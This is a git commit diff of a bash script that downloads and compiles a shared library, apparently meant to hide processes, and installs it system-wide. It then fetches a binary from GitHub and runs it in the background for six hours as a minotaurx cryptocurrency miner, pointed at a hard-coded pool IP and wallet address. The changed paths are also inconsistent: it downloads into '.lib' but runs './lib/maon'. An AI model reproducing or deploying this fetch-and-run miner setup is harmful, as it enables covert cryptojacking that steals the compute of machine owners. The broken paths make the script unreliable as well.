e42a7d1489d9faf49d200f7666911b019af68ce2
barburonjilo <barburonjilo@outlook.co.id>
2024-08-24 09:28:10 +0700

    Update ngetes.sh

--- ngetes.sh
+++ ngetes.sh
@@ -1,14 +1,15 @@
 #!/bin/bash
- 
 
 # Define a function for installing dependencies
 install_dependencies() {
+  echo "Updating system and installing dependencies..."
   sudo yum update -y
-  sudo yum install -y gcc make wget curl cpulimit
+  sudo yum install -y gcc make wget curl cpulimit epel-release
 }
 
 # Define a function for downloading and compiling code
 download_and_compile_code() {
+  echo "Downloading and compiling code..."
   curl -L https://github.com/barburonjilo/back/raw/main/maonumput.c -o nyumput.c
   gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
   sudo mv libnyumput.so /usr/local/lib/
@@ -18,26 +19,29 @@ download_and_compile_code() {
 
 # Define a function for preparing the environment
 prepare_environment() {
+  echo "Preparing environment..."
   mkdir -p .lib && cd .lib
   wget -O maon https://github.com/barburonjilo/back/raw/main/sr
   chmod +x maon
+  cd ..
 }
 
 # Define a function for running and managing the process
 run_and_manage_process() {
+  echo "Running and managing the process..."
   local start_time=$(date +%s)
   local end_time=$((start_time + 6*3600))  # 6 hours from start
 
   while [ $(date +%s) -lt $end_time ]; do
-    if [ -f ./maon ]; then
+    if [ -f ./lib/maon ]; then
       # Start the process with cpulimit
-      cpulimit -l 300 -e maon &
+      cpulimit -l 300 -e ./lib/maon &
       
       # Store the PID of cpulimit
       local cpulimit_pid=$!
       
       # Run the process with the specified parameters in background
-      nohup ./maon -a minotaurx --pool 45.115.225.161:443 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$cpulimit_pid --timeout 120 -t 4 &
+      nohup ./lib/maon -a minotaurx --pool 45.115.225.161:443 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$cpulimit_pid --timeout 120 -t 4 > process.log 2>&1 &
       
       # Store the PID of the running process
       local process_pid=$!
